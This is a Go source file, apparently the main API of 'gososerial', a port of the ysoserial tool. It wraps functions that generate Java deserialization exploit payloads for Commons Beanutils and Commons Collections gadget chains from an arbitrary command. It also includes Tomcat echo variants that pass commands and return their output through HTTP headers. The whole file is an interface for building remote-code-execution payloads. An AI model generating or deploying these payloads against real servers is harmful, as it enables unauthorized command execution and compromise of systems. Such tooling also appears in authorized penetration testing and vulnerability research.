package gososerial

import (
	"github.com/EmYiQing/Gososerial/ysoserial/gadget"
)

func GetCB1(cmd string) []byte {
	return gadget.GetCommonsBeanutils1(cmd)
}

func GetCC1(cmd string) []byte {
	return gadget.GetCommonsCollections1(cmd)
}

func GetCC2(cmd string) []byte {
	return gadget.GetCommonsCollections2(cmd)
}

func GetCC3(cmd string) []byte {
	return gadget.GetCommonsCollections3(cmd)
}

func GetCC4(cmd string) []byte {
	return gadget.GetCommonsCollections4(cmd)
}

func GetCC5(cmd string) []byte {
	return gadget.GetCommonsCollections5(cmd)
}

func GetCC6(cmd string) []byte {
	return gadget.GetCommonsCollections6(cmd)
}

func GetCC7(cmd string) []byte {
	return gadget.GetCommonsCollections7(cmd)
}

func GetCCK1(cmd string) []byte {
	return gadget.GetCommonsCollectionsK1(cmd)
}

func GetCCK1TomcatEcho(echoHeaderName, cmdHeaderName string) []byte {
	return gadget.GetCCK1TomcatEcho(echoHeaderName, cmdHeaderName)
}

func GetCCK2(cmd string) []byte {
	return gadget.GetCommonsCollectionsK2(cmd)
}

func GetCCK2TomcatEcho(echoHeaderName, cmdHeaderName string) []byte {
	return gadget.GetCCK2TomcatEcho(echoHeaderName, cmdHeaderName)
}

func GetCCK3(cmd string) []byte {
	return gadget.GetCommonsCollectionsK3(cmd)
}

func GetCCK4(cmd string) []byte {
	return gadget.GetCommonsCollectionsK4(cmd)
}

func GetAllNames() []string {
	return []string{
		gadget.CB1,
		gadget.CC1,
		gadget.CC2,
		gadget.CC3,
		gadget.CC4,
		gadget.CC5,
		gadget.CC6,
		gadget.CC7,
		gadget.CCK1,
		gadget.CCK1TomcatEcho,
		gadget.CCK2,
		gadget.CCK2TomcatEcho,
		gadget.CCK3,
		gadget.CCK4,
	}
}
